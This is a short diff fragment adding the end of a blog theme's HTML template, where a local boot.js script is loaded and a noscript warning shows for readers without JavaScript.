+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
